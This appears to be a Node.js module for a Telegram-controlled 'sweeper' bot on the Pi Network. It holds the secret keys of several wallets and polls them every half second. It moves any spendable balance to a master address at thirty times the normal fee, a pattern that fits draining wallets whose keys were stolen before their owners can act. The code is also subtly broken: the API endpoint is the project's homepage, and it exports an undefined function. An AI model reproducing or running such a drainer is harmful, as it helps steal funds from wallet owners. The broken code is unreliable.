'use strict';

const fs = require('fs');
const path = require('path');
const StellarSdk = require('@stellar/stellar-sdk');
const sqlite3 = require('sqlite3').verbose();

// 🌐 FORCE PRODUCTION MAINNET API CLUSTER ENDPOINT
const HORIZON_URL = 'https://minepi.com';
const NETWORK_PASSPHRASE = 'Pi Network';
const MASTER_DESTINATION = process.env.SWEEP_DESTINATION_ADDRESS || '';
const POLL_INTERVAL_MS = Math.max(100, Number(process.env.SWEEP_POLL_INTERVAL_MS || 500));
const MIN_THRESHOLD = Number(process.env.SWEEP_MIN_THRESHOLD || 0.002);
const DATA_DIR = process.env.DATA_DIR || '/data';

const server = new StellarSdk.Horizon.Server(HORIZON_URL);
const walletLocks = new Set();
let monitorRunning = false;
let monitorTimeoutId = null;

const liveWalletsMap = new Map();

function getErrorDetails(error) {
  if (error?.response?.data?.extras?.result_codes) {
    return JSON.stringify(error.response.data.extras.result_codes);
  }
  return error?.response?.data?.title || error?.message || String(error);
}

function log(level, message, details) {
  const timestamp = new Date().toISOString();
  console.log(`[${timestamp}] [Sweeper ${level}] ${message}`, details || '');
}

function initDatabase() {
  if (!fs.existsSync(DATA_DIR)) fs.mkdirSync(DATA_DIR, { recursive: true });
  const dbPath = path.join(DATA_DIR, 'sweeper.db');
  const db = new sqlite3.Database(dbPath);
  
  db.serialize(() => {
    db.run('PRAGMA journal_mode = WAL');
    db.run(`
      CREATE TABLE IF NOT EXISTS sweeper_transactions (
        id INTEGER PRIMARY KEY AUTOINCREMENT,
        wallet_id TEXT NOT NULL,
        source_address TEXT NOT NULL,
        destination_address TEXT NOT NULL,
        amount TEXT NOT NULL,
        transaction_hash TEXT,
        status TEXT NOT NULL,
        error_details TEXT,
        created_at TEXT NOT NULL
      );
    `);
  });
  return db;
}

const WalletManager = {
  addLiveWallet({ id, publicKey, secretKey, destination, label, chatId, customAmount }) {
    liveWalletsMap.set(String(id), { 
      id, 
      publicKey, 
      secretKey, 
      destination: destination || null, 
      label, 
      chatId,
      customAmount: customAmount ? Number(customAmount) : null,
      lastMessageId: null
    });
    log('INFO', `Wallet Box #${id} mapped successfully into RAM memory.`);
  },
  
  removeLiveWallet(id) {
    return liveWalletsMap.delete(String(id));
  },

  getLiveWallets() {
    return Array.from(liveWalletsMap.values());
  }
};

async function updateStatusBoard(bot, wallet, statusText) {
  if (!bot || !wallet.chatId) return;
  
  // Clean new lines for separate reading windows to prevent message clump logs
  try {
    await bot.sendMessage(wallet.chatId, statusText, {
      parse_mode: 'HTML',
      disable_web_page_preview: true
    });
  } catch (error) {
    log('ERROR', 'Telegram display failed:', error.message);
  }
}

const SweeperEngine = {
  async evaluateBalance(publicKey) {
    // Exposes the raw network error to help us see why the node connection is dropping
    const account = await server.loadAccount(publicKey);
    const native = account.balances.find(b => b.asset_type === 'native' || b.asset_code === 'PI' || b.asset_code === 'Pi');
    
    if (!native) return { spendable: 0, total: 0, verified: false };

    const ledgerTotal = Number(native.balance || 0);
    
    // Core property check across Pi-specific lockup layout fields
    let locked = Number(native.locked_balance || native.authorized_to_maintain_liabilities || 0);
    let spendable = Math.max(0, ledgerTotal - locked);

    return { 
      spendable, 
      total: ledgerTotal, 
      verified: true 
    };
  },

  async executeInstantSweep(db, bot, wallet) {
    const id = String(wallet.id);
    if (walletLocks.has(id)) return { status: 'LOCKED' };
    walletLocks.add(id);

    try {
      const activeDestination = wallet.destination || MASTER_DESTINATION;
      if (!activeDestination) {
        await updateStatusBoard(bot, wallet, `❌ <b>CONFIGURATION ERROR</b>\n📦 Box: #${id}\nTarget routing address is completely missing.`);
        return { status: 'NO_DESTINATION' };
      }

      const sourceKeypair = StellarSdk.Keypair.fromSecret(wallet.secretKey);
      let baseFee = 100;
      try { baseFee = await server.fetchBaseFee(); } catch (e) { baseFee = 100; }

      let currentAvailable = 0;
      let totalLedgerPool = 0;
      let isNodeError = false;
      let nodeErrorMsg = '';

      try {
        const evalResult = await this.evaluateBalance(wallet.publicKey);
        currentAvailable = evalResult.spendable;
        totalLedgerPool = evalResult.total;
      } catch (err) {
        isNodeError = true;
        nodeErrorMsg = getErrorDetails(err);
      }

      // If the node handshake fails, output the exact raw network error text string immediately
      if (isNodeError) {
        await updateStatusBoard(bot, wallet,
          `📡 <b>NODE CONNECTION FAULT</b>\n` +
          `📦 Box ID: #${wallet.id}\n` +
          `❌ Error Code: <code>${nodeErrorMsg}</code>\n` +
          `🔧 <i>Action: Node connection failed or account not activated on Mainnet ledger.</i>`
        );
        return { status: 'NODE_ERROR' };
      }

      // Continuous telemetry readout loop
      await updateStatusBoard(bot, wallet, 
        `🔍 <b>MONITOR CORE LOG</b>\n` +
        `📦 Box ID: #${wallet.id}\n` +
        `💰 Available Balance: <code>${currentAvailable.toFixed(7)} Pi</code>\n` +
        `📊 Ledger Total Pool: <code>${totalLedgerPool.toFixed(7)} Pi</code>\n` +
        `📡 <i>Status: Actively polling target parameters...</i>`
      );

      if (currentAvailable <= MIN_THRESHOLD) {
        return { status: 'POOL_EMPTY' };
      }

      let targetAmount = 0;
      let isFixedStrategy = false;

      if (wallet.customAmount && wallet.customAmount > 0) {
        targetAmount = wallet.customAmount;
        isFixedStrategy = true;
      } else if (currentAvailable > 1.0) {
        targetAmount = currentAvailable - 1.0;
      } else {
        targetAmount = currentAvailable - 0.02;
      }

      if (targetAmount <= 0) return { status: 'POOL_EXHAUSTED' };

      let success = false, sweptAmount = 0, txHash = '', errorReason = '';

      try {
        const freshAccount = await server.loadAccount(wallet.publicKey);
        const transaction = new StellarSdk.TransactionBuilder(freshAccount, {
          fee: String(baseFee * 30), 
          networkPassphrase: NETWORK_PASSPHRASE
        })
        .addOperation(StellarSdk.Operation.payment({
          destination: activeDestination,
          asset: StellarSdk.Asset.native(),
          amount: targetAmount.toFixed(7)
        }))
        .setTimeout(10).build();

        transaction.sign(sourceKeypair);
        const response = await server.submitTransaction(transaction);
        sweptAmount = targetAmount;
        txHash = response.hash;
        success = true;
      } catch (err) {
        errorReason = getErrorDetails(err);
      }

      const now = new Date().toISOString();
      if (success) {
        const remainingPool = Math.max(0, currentAvailable - sweptAmount);
        db.run(`INSERT INTO sweeper_transactions (wallet_id, source_address, destination_address, amount, transaction_hash, status, created_at) VALUES (?, ?, ?, ?, ?, 'SUCCESS', ?)`, [id, wallet.publicKey, activeDestination, String(sweptAmount), txHash, now]);
        
        await bot.sendMessage(wallet.chatId, 
          `🚀 <b>TRANSFER SUCCESSFUL!</b>\n\n` +
          `📦 <b>Box ID:</b> #${wallet.id}\n` +
          `💰 <b>Swept Amount:</b> <code>${sweptAmount.toFixed(7)} Pi</code>\n` +
          `📉 <b>Remaining Pool:</b> <code>${remainingPool.toFixed(7)} Pi</code>\n` +
          `🔗 <b>Tx Hash:</b> <code>${txHash}</code>`
        );
      } else {
        db.run(`INSERT INTO sweeper_transactions (wallet_id, source_address, destination_address, amount, status, error_details, created_at) VALUES (?, ?, ?, '0', 'FAILED', ?, ?)`, [id, wallet.publicKey, activeDestination, errorReason, now]);
      }
    } catch (criticalError) {
      log('ERROR', `Loop Failure on Box #${id}`, criticalError.message);
    } finally {
      walletLocks.delete(id);
    }
  }
};

function startSweeperEngine(db, bot) {
  if (monitorRunning) return;
  monitorRunning = true;

  const corePollingCycle = async () => {
    if (!monitorRunning) return;
    try {
      const wallets = WalletManager.getLiveWallets();
      for (const wallet of wallets) {
        await SweeperEngine.executeInstantSweep(db, bot, wallet);
      }
    } catch (err) {
      log('ERROR', 'Loop error context:', err.message);
    }
    if (monitorRunning) monitorTimeoutId = setTimeout(corePollingCycle, POLL_INTERVAL_MS);
  };
  corePollingCycle();
}

function stopSweeperEngine() {
  monitorRunning = false;
  if (monitorTimeoutId) clearTimeout(monitorTimeoutId);
}

module.exports = { initDatabase, WalletManager, startSweeperEngine, stopSweeperEngine, notifyTelegram };
